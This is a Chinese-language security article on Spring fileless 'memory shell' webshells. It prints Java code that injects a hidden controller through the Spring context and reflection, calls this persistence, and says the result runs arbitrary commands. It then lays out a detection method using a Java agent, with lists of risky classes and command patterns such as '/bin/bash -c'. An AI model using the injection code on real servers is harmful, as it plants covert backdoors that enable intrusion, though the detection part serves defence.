## **一、内存马概念介绍**

木马或是内存马，都是攻击者在“后门阶段”的一种利用方式。按攻击者的攻击套路顺序，“后门阶段”一般是在攻击者“拿到访问权”或是“提权”之后的下一步动作，也叫“权限维持”。

业界通常将木马的种类划分成“有文件马”和“无文件马”两类。“有文件马”也就是我们常见的“二进制木马、网马”；“无文件马”是无文件攻击的一种方式，其常见的类型有：内存马、隐蔽恶意代码启动等。

##  **二、Spring可利用点**

    
    
    DispatcherServlet.java
    
    
    
    
    protected void doDispatch(HttpServletRequest request, HttpServletResponse response) throws Exception {
    
    HttpServletRequest processedRequest = request;
    
    HandlerExecutionChain mappedHandler = null;
    
    boolean multipartRequestParsed = false;
    
    WebAsyncManager asyncManager = WebAsyncUtils.getAsyncManager(request);
    
    try {
    
    ModelAndView mv = null;
    
    Exception dispatchException = null;
    
    try {
    
    // Determine handler adapter for the current request.
    
    HandlerAdapter ha = getHandlerAdapter(mappedHandler.getHandler());
    
    // Process last-modified header, if supported by the handler.
    
    ...
    
    // Actually invoke the handler.
    
    mv = ha.handle(processedRequest, response, mappedHandler.getHandler());
    
    if (asyncManager.isConcurrentHandlingStarted()) {
    
    return;
    
    }
    
    applyDefaultViewName(processedRequest, mv);
    
    mappedHandler.applyPostHandle(processedRequest, response, mv);
    
    }
    
    catch (Exception ex) {
    
    dispatchException = ex;
    
    }
    
    processDispatchResult(processedRequest, response, mappedHandler, mv, dispatchException);
    
    }
    
    ....
    
    }

从上面可以看到通过getHandler获取HandlerExecutionChain,获取处理器适配器HandlerAdapter执行HandlerAdapter处理一系列的操作，如：参数封装，数据格式转换，数据验证等操作。

然后执行handler

ha.handle(processedRequest, response, mappedHandler.getHandler());

最后返回直接结果。

获取Handler过程中发现会从AbstractHandlerMethodMapping#lookupHandlerMethod（）方法获取对应
MappingRegistry() 中的HandlerMethod。

MappingRegistry有对应的开放的注册方法：

    
    
    protected void detectHandlerMethods(final Object handler) {
    
    Class<?> handlerType = (handler instanceof String ?
    
    getApplicationContext().getType((String) handler) : handler.getClass());
    
    final Class<?> userType = ClassUtils.getUserClass(handlerType);
    
    
    
    
    Map<Method, T> methods = MethodIntrospector.selectMethods(userType,
    
    new MethodIntrospector.MetadataLookup<T>() {
    
    @Override
    
    public T inspect(Method method) {
    
    return getMappingForMethod(method, userType);
    
    }
    
    });
    
    if (logger.isDebugEnabled()) {
    
    logger.debug(methods.size() + " request handler methods found on " + userType + ": " + methods);
    
    }
    
    for (Map.Entry<Method, T> entry : methods.entrySet()) {
    
    registerHandlerMethod(handler, entry.getKey(), entry.getValue());
    
    }
    
    }
    
    protected void registerHandlerMethod(Object handler, Method method, T mapping) {
    
    this.mappingRegistry.register(mapping, handler, method);
    
    }

如此便可以使用springContext动态注入HandlerMethod。

注入代码：

    
    
    //使用自定义类加载拉起 ThreatClass.clss
    
    MyClassLoad myClassLoad = new MyClassLoad("D:\\javadeps\\attck\\", ClassLoader.getSystemClassLoader());
    
    byte[] data = myClassLoad.findClassInStream("com.safedog.controller.ThreatClass");
    
    Class<?> aClass = myClassLoad.defineClasses("com.safedog.controller.ThreatClass", data, 0, data.length);
    
    //获得springContext
    
    GenericApplicationContext context = (GenericApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
    
    // 注入bean
    
    String dynamicControllerBeanName = "testController";
    
    try{
    
    context.getBean(dynamicControllerBeanName);
    
    }catch (Exception e){
    
    context.getBeanFactory().registerSingleton(dynamicControllerBeanName, aClass.newInstance());
    
    }
    
    
    
    
    org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);
    
    
    
    
    java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod("detectHandlerMethods", Object.class);
    
    m1.setAccessible(true);
    
    
    
    
    //执行detectHandlerMethods注入hander
    
    m1.invoke(requestMappingHandlerMapping, "testController");

ThreatClass：

![BH5IOLVP_Xhk4.png](https://image.3001.net/images/20210428/1619590987_6088ff4b182b82a9aa3cf.png!small)

内存马注入后执行任意命令：

![0nCx4qeJE_TPTy.png](https://image.3001.net/images/20210428/1619590987_6088ff4b8386d2ba1327a.png!small)

##  **三、检测思路**

流程图：

![J5FqVqHS_I7JI.png](https://image.3001.net/images/20210428/1619590987_6088ff4be1d26cf061e2f.png!small)

1、使用java Agent探针动态注入防御agent到应用进程中：

    
    
    public static void attach(String jvm_pid, String agent_jar_path) throws Exception {
    
    VirtualMachine virtualMachine = null;
    
    VirtualMachineDescriptor virtualMachineDescriptor = null;
    
    for (VirtualMachineDescriptor descriptor : VirtualMachine.list()) {
    
    String pid = descriptor.id();
    
    if (pid.equals(jvm_pid)) {
    
    virtualMachineDescriptor = descriptor;
    
    break;
    
    }
    
    }
    
    try {
    
    if (null == virtualMachineDescriptor) {
    
    virtualMachine = VirtualMachine.attach(jvm_pid);
    
    } else {
    
    virtualMachine = VirtualMachine.attach(virtualMachineDescriptor);
    
    }
    
    virtualMachine.loadAgent(agent_jar_path);
    
    } catch (Throwable t) {
    
    t.printStackTrace();
    
    } finally {
    
    if (null != virtualMachine) {
    
    virtualMachine.detach();
    
    }
    
    }
    
    }

  
2、被注入的agent（符合jvm规范），JVM会回调agentmain方法并注入Instrumentation。Instrumentation中有一个api能够加载出运行时JVM中所有的class

    
    
    public Class[] getAllLoadedClasses() {
    
    return this.getAllLoadedClasses0(this.mNativeAgent);
    
    }
    
    private native Class[] getAllLoadedClasses0(long var1);

3、拿到运行时的类根据高风险父类、接口、注解做扫描，把扫描到的类反编译为明文的java文件

    
    
    CfrDriver driver =
    
    new CfrDriver.Builder().withOptions(options).withOutputSink(mySink).build();
    
    List<String> toAnalyse = new ArrayList<String>();
    
    toAnalyse.add(classFilePath);
    
    driver.analyse(toAnalyse);

4、发现明显的敏感操作

Runtime.getRuntime().exec()

cmd.exe /c

/bin/bash -c

且磁盘源class文件不存在

URL url = clazz.getClassLoader().getResource(classNamePath);

url为空磁盘上没有对应文件。

证明此classs就是内存木马并记录

5、卸载自身实例

风险父类

> org.springframework.web.method.HandlerMethod

风险接口

> org.springframework.web.HttpRequestHandler

风险注解

> org.springframework.stereotype.Controller
>
> org.springframework.web.bind.annotation.RestController
>
> org.springframework.web.bind.annotation.RequestMapping
>
> org.springframework.web.bind.annotation.GetMapping
>
> org.springframework.web.bind.annotation.PostMapping
>
> org.springframework.web.bind.annotation.PatchMapping
>
> org.springframework.web.bind.annotation.PutMapping
>
> org.springframework.web.bind.annotation.Mapping

